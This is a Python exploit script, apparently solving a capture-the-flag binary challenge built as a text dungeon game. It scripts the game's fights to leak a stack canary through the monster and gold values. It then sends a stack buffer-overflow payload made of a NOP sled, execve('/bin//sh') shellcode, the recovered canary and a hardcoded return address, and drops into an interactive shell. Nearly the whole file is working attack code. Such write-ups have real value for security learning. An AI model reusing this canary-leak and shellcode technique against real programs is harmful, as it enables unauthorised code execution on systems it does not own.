import interact
import struct
import re
import time
# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

def extract_value(data):
    monster_reg = re.compile(r"\b[a-f0-9]{2,}\b")
    match = monster_reg.search(str(data))
    if match:
        print(f"[+] Monster: {match.group(0)}")
        return int(match.group(0),16)
    print("[-] no monster")
    return 0

def neg_val(hex_value):
    return (hex((~hex_value)&0xFFFFFFFF))

p = interact.Process()

def start():
    # intiitalization
    p.readuntil('\n')
    p.sendline('')

def reach_array_end():
    for i in range(4):
        start()
        p.readuntil('quit)')
        p.sendline('left')
        data = p.readuntil('(run, fight)')
        attack = neg_val(extract_value(data))
        print(f"[+] Attack = {attack}")
        p.sendline("fight")
        p.readuntil('Enter your attack in hex!')
        p.sendline(attack)

def move_down():
    p.readuntil('quit)')
    p.sendline('down')
    start()
    p.readuntil('quit)')
    p.sendline('down')
    data = p.readuntil('(run, fight)')
    attack = neg_val(extract_value(data))
    print(f"[+] Attack = {attack}")
    p.sendline('fight')
    p.readuntil('Enter your attack in hex!')
    p.sendline(attack)
    print('[+] Moving Right')
    for i in range(2):
        p.readuntil('Press enter to continue...')
        p.sendline('')
        p.readuntil('quit)')
        p.sendline('right')
        data = p.readuntil('(run, fight)')
        attack = neg_val(extract_value(data))
        print(f"[+] Attack = {attack}")
        p.sendline("fight")
        p.readuntil('Enter your attack in hex!')
        p.sendline(attack)

    
reach_array_end()
start()
move_down()

start()
prev_data  = p.readuntil('quit)')
gold_reg = re.compile(r"\d{4,}")
prev_gold = gold_reg.search(str(prev_data)).group(0)
print(f"[+] Prev Gold: {prev_gold}")
p.sendline('right')
data = p.readuntil('(run, fight)')
last_bytes = extract_value(data)
print(f"[+] lastbytes of canary: {last_bytes}")
attack = neg_val(extract_value(data))
p.sendline('fight')
p.readuntil('Enter your attack in hex!')
p.sendline(attack)
print("[+] Attacked") 


start()
gold_data = p.readuntil('quit)')
gold_reg = re.compile(r"\d{4,}")
curr_gold = gold_reg.search(str(gold_data)).group(0)
print(gold_data)
print(f"[+] Current Gold :  {curr_gold}")

top_half = int(curr_gold) - int(prev_gold)
stack_canary = (last_bytes << 32) | top_half
print(f"[+] Stack Canary : {hex(stack_canary)}")
p.sendline('quit')


p.readuntil('name:')
shellcode =  b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
nops = b'\x90'*(40-len(shellcode))
payload = nops + shellcode + p64(stack_canary) + b"A"*8 + p64(0x7fffffffecd0)
p.sendline(payload)
start()

p.interactive()
